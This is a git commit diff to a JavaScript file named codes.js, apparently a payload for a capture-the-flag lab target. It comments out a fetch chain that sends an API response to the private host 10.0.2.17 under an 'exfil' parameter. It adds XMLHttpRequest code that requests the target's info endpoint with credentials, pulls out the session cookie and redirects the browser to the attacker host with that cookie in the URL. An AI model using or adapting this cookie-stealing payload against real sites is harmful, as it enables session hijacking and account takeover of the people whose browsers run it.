2b359b5694ef296fa78329d468d2d8eb3b6c60e3
EsevKa <139042999+Esevka@users.noreply.github.com>
2025-04-22 17:30:27 +0200

    Update codes.js

--- codes.js
+++ codes.js
@@ -1,8 +1,18 @@
-fetch('https://guitjapeo.thl/api/info')
-        .then(resp => resp.text())
-        .then(text => {
-                fetch(`http://10.0.2.17/?exfil=${text}`);
-        })
-        .catch(err => {
-                fetch(`http://10.0.2.17/?error=${err}`);
-        });
+// fetch('https://guitjapeo.thl/api/info')
+//         .then(resp => resp.text())
+//         .then(text => {
+//                 fetch(`http://10.0.2.17/?exfil=${text}`);
+//         })
+//         .catch(err => {
+//                 fetch(`http://10.0.2.17/?error=${err}`);
+//         });
+var req = new XMLHttpRequest();
+req.onload=reqListener;
+var url="https://guitjapeo.thl/api/info";
+req.withCredentials=true;
+req.open("GET",url,false);
+req.send();
+function reqListener() {
+    const sess=JSON.parse(this.responseText).cookie;
+    location.href="http://10.0.2.17/?data="+sess;
+};
